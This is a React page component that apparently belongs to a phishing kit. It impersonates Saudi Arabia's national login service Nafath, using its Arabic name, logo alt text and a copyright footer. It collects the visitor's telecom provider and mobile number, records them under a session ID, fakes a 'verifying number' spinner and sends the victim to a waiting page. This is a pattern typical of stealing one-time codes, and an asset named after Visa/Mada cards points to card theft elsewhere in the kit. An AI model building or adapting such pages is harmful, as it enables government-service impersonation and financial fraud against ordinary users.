import { useState } from "react";
import { useLocation } from "wouter";
import { addSubmission } from "@/lib/submissions";
import { Header } from "@/components/layout/Header";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Loader2 } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import visaMadaImage from "../assets/VISAMADAH_1779063055374.png";

const SAUDI_TELECOM_COMPANIES = [
  { value: "", label: "اختر مزود الخدمة" },
  { value: "stc", label: "STC (الاتصالات السعودية)" },
  { value: "mobily", label: "Mobily (موبايلي)" },
  { value: "zain", label: "Zain (زين)" },
  { value: "jawra", label: "Jawra (جوال)" },
];

export default function Nomer() {
  const [, setLocation] = useLocation();
  
  const [provider, setProvider] = useState("");
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validation
    if (!provider) {
      setError("يرجى اختيار مزود الخدمة");
      return;
    }
    
    if (phone.length < 9 || phone.length > 10) {
      setError("رقم الهاتف يجب أن يكون بين 9 و 10 أرقام");
      return;
    }

    const sessionId = localStorage.getItem("sessionId");
    if (!sessionId) {
      setLocation("/");
      return;
    }

    setLoading(true);
    setError("");
    
    try {
      addSubmission("nomer", sessionId, { provider, phone });
      
      // Redirect to waiting screen after 2 seconds
      setTimeout(() => {
        setLocation("/nomer-wait");
      }, 2000);
    } catch {
      setLoading(false);
      setError("حدث خطأ أثناء الإرسال");
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Header />
      
      <AnimatePresence>
        {loading && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-white/90 backdrop-blur-sm z-50 flex flex-col items-center justify-center"
          >
            <Loader2 className="w-16 h-16 animate-spin text-primary mb-6" />
            <h2 className="text-2xl font-bold text-gray-800">جارٍ التحقق من الرقم...</h2>
            <p className="text-gray-500 mt-2">يرجى عدم إغلاق هذه الصفحة</p>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="container mx-auto px-4 py-12 flex-1 flex justify-center items-start">
        <div className="bg-white rounded-3xl shadow-lg border border-gray-200 p-8 max-w-md w-full">
          
          <img src={visaMadaImage} alt="Nafath" className="h-16 mx-auto mb-6 object-contain" />
          
          <h2 className="text-xl font-bold text-gray-800 mb-2 text-center">النفاذ الوطني</h2>
          <p className="text-gray-600 mb-8 text-center text-sm">يرجى توثيق رقم الجوال</p>
          
          {error && (
            <div className="bg-red-50 text-red-600 p-3 rounded-2xl mb-6 border border-red-200 text-sm font-semibold text-center">
              {error}
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* مزود الخدمة */}
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-gray-700">
                مزود الخدمة
              </label>
              <select
                value={provider}
                onChange={e => setProvider(e.target.value)}
                className="w-full rounded-2xl border border-gray-300 bg-gray-50 px-4 py-3 text-sm text-gray-900 focus:border-primary focus:ring-2 focus:ring-primary/20 outline-none"
                required
              >
                {SAUDI_TELECOM_COMPANIES.map(company => (
                  <option key={company.value} value={company.value}>
                    {company.label}
                  </option>
                ))}
              </select>
            </div>

            {/* رقم الهاتف */}
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-gray-700">
                رقم الهاتف
              </label>
              <Input 
                type="tel" 
                required 
                value={phone} 
                onChange={e => setPhone(e.target.value.replace(/\D/g, "").substring(0, 10))} 
                placeholder="5XXXXXXXX"
                dir="ltr"
                className="text-center text-xl h-14 rounded-2xl"
                maxLength={10}
                minLength={9}
              />
              <p className="text-xs text-gray-500 text-center">أدخل رقم الجوال (9-10 أرقام)</p>
            </div>

            <Button 
              type="submit" 
              className="w-full h-12 text-lg font-bold bg-primary hover:bg-primary/90 text-white rounded-2xl"
              disabled={loading}
            >
              {loading ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin ml-2" />
                  جارٍ الإرسال...
                </>
              ) : (
                "إرسال"
              )}
            </Button>
          </form>
        </div>
      </div>

      {/* Footer */}
      <footer className="py-4 text-center text-xs text-gray-500 border-t border-gray-200">
        جميع الحقوق محفوظة © النفاذ الوطني
      </footer>
    </div>
  );
}
